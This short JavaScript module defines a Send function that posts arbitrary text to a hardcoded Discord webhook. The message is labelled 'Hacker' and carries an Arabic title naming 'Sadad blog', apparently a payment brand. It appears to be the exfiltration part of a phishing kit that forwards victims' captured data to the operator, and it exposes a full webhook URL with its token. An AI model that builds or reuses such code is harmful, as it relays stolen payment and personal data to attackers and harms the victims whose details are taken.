import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328048090552205332/aKhqPeQPgxwteBnpPr2pSnkG81Rm1W1qTTfBmmO1tYSgkaGD0W04AD1T8J6Q0JWectu4",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
